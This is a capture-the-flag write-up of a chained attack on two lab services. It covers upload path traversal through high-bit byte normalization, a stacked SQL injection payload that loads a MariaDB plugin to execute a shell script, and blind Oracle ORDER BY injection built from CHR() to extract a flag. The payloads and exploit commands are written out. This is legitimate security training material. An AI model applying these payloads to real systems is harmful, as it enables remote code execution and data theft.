# Mikasa -> Eren writeup


x'; INSTALL SONAME 'rpl'; SELECT 'x


## 1. Summary

Challenge has two relevant internal services:

- `mikasa`: Spring Boot + local MariaDB, exposed through nginx.
- `eren`: Node.js + LoopBack Oracle connector, reachable from the Mikasa container as `http://eren-app:3000`.

The intended chain is:

1. Use Mikasa upload path traversal to write files into MariaDB's `plugin_dir`.
2. Use Mikasa SQL injection to load a MariaDB plugin.
3. The plugin executes a shell script inside Mikasa.
4. The shell script pivots to Eren and extracts the Oracle flag using blind SQL injection in `ORDER BY`.
5. The shell script stores the result back into Mikasa's `user` table.
6. Query `/search` for `eren_flag` to retrieve the flag.

The verified test flag was:

```text
KMACTF{chatgpt_codex}
```

## 2. Relevant files

- `rpl_plugin.c`: MariaDB daemon plugin. When loaded, it runs `/home/ctf/lib/plugins/r.sh`.
- `r.sh`: blind SQLi extractor for Eren. It writes the extracted flag into Mikasa DB as user `eren_flag`.
- `rpl.so`: compiled Linux x86_64 MariaDB plugin.
- `exploit_flow.py`: uploads `rpl.so` and `r.sh`, triggers `INSTALL SONAME`, then reads `eren_flag`.

## 3. Mikasa bugs

### SQL injection in `/search`

Mikasa builds the SQL query by concatenating `username`:

```java
String query = "SELECT * FROM user WHERE username = '" + username + "'";
```

The datasource has `allowMultiQueries=true`, so the injection can execute an extra statement:

```sql
x'; INSTALL SONAME 'rpl'; SELECT 'x
```

The blacklist blocks words like `union`, `file`, `exec`, `alter`, but it does not block `INSTALL` or `SONAME`.

### Upload path traversal after normalization

The upload filter checks the original filename for `.`, `/`, `\`, and similar strings. After the check, the app normalizes each byte:

```java
b[i] = (byte)(b[i] & 0x7F);
```

That makes high-bit bytes become dangerous ASCII after validation:

- `0xaf` becomes `/`
- `0xae` becomes `.`

The file is then written with:

```java
Path target = base.resolve(prefix + transformed).normalize();
Files.write(target, content, ...);
```

So a crafted filename can escape `/tmp/uploads/<user_id>/` and write to:

```text
/home/ctf/lib/plugins/rpl.so
/home/ctf/lib/plugins/r.sh
```

This matters because MariaDB is configured with:

```text
plugin_dir=/home/ctf/lib/plugins
```

and the app DB user has enough privilege on `mysql.plugin` for `INSTALL SONAME`.

## 4. Eren bug

Eren accepts `field` from query string and passes it into LoopBack's `order` option:

```js
orderBy = field + ' ' + sort;
...
order: [orderBy],
```

The endpoint is:

```text
/api/faction/scan?field=<injected order expression>
```

This gives SQL injection in Oracle `ORDER BY`. Since the endpoint does not return `FLAG_FACTION.SECRET`, the exploit uses a boolean/error oracle:

- true branch: valid expression, response has `"success":true`
- false branch: force `TO_CHAR(TO_NUMBER('x'))`, response has Oracle error `ORA-01722`

## 5. Why `CHR(...)` is used

The original `LIKE 'prefix%'` payload works for uppercase flags, but the Eren path uppercases injected string literals. For a lowercase flag such as:

```text
KMACTF{chatgpt_codex}
```

the literal `'KMACTF{c%'` is transformed in a way that no longer matches lowercase `c`.

`r.sh` avoids this by building the pattern with Oracle `CHR(...)`:

```sql
SECRET LIKE CHR(75)||CHR(77)||CHR(65)||...||'%' ESCAPE CHR(33)
```

This also avoids comma issues from functions like `SUBSTR(SECRET,1,1)`, because the connector splits `ORDER BY` items on commas.

Special `LIKE` characters are escaped:

- `!` becomes `CHR(33)||CHR(33)`
- `%` becomes `CHR(33)||CHR(37)`
- `_` becomes `CHR(33)||CHR(95)`

## 6. Build plugin

Build inside an environment compatible with the challenge container:

```sh
gcc -Wall -fPIC -shared -o rpl.so rpl_plugin.c
```

For the local Docker challenge, this is enough:

```powershell
docker cp mikasa_solution\rpl_plugin.c mikasa:/tmp/rpl_plugin.c
docker exec mikasa gcc -Wall -fPIC -shared -o /tmp/rpl.so /tmp/rpl_plugin.c
docker cp mikasa:/tmp/rpl.so mikasa_solution\rpl.so
```

## 7. Run exploit

Install Python dependency if needed:

```sh
pip install requests
```

Run against the public Mikasa URL:

```sh
python mikasa_solution/exploit_flow.py http://127.0.0.1
```

Expected output:

```text
KMACTF{chatgpt_codex}
```

Use `http://127.0.0.1`, not `http://localhost`, if `localhost:80` is occupied by another local web server.

## 8. What `exploit_flow.py` does

1. Uploads `rpl.so` to `/home/ctf/lib/plugins/rpl.so`.
2. Uploads `r.sh` to `/home/ctf/lib/plugins/r.sh`.
3. Uses high-bit filename normalization to bypass the upload path filter:
   - `0xaf` normalizes to `/`
   - `0xae` normalizes to `.`
4. Triggers SQL injection on `/search`:

```sql
x'; INSTALL SONAME 'rpl'; SELECT 'x
```

5. The plugin runs `r.sh`.
6. `r.sh` extracts the Eren flag via Oracle `ORDER BY` blind SQLi and inserts it into Mikasa's `user` table as:

```text
username = eren_flag
email    = <flag>
```

7. The script polls `/search` for `eren_flag` and prints the flag.

## 9. Manual verification

After a successful run, `/search` should show:

```text
[{username=eren_flag, email=KMACTF{chatgpt_codex}}]
```

For local Docker testing only, you can verify the row directly:

```powershell
@'
SELECT username,email FROM user WHERE username='eren_flag';
'@ | docker exec -i mikasa mysql "-h127.0.0.1" "-uuser" "-ppassword" mydb
```

## 10. Troubleshooting

If the output is only:

```text
KMACTF{
```

then the extractor failed after the known prefix. Common causes:

- `r.sh` is still using direct string literals instead of `CHR(...)`.
- The charset in `r.sh` does not contain a character present in the flag.
- The Eren payload contains commas, causing LoopBack/connector to split the `ORDER BY`.

If `INSTALL SONAME 'rpl'` appears to do nothing:

- Confirm `rpl.so` was compiled for Linux x86_64.
- Confirm the plugin name inside `_maria_plugin_declarations_` is `rpl`.
- If the plugin was already loaded, run `UNINSTALL SONAME 'rpl'` during local testing and trigger again.

If the exploit times out:

- Check that the target URL is the Mikasa public URL.
- Try `http://127.0.0.1` instead of `http://localhost` in the local lab.
- Ensure both `rpl.so` and `r.sh` are in `mikasa_solution/` before running `exploit_flow.py`.

## 11. Reset local test state

Only for local Docker testing:

```powershell
@'
UNINSTALL SONAME 'rpl';
DELETE FROM user WHERE username='eren_flag';
'@ | docker exec -i mikasa mysql "-h127.0.0.1" "-uuser" "-ppassword" mydb

docker exec mikasa rm -f /home/ctf/lib/plugins/rpl.so /home/ctf/lib/plugins/r.sh /tmp/eren_flag_status.txt /tmp/rpl.out
```
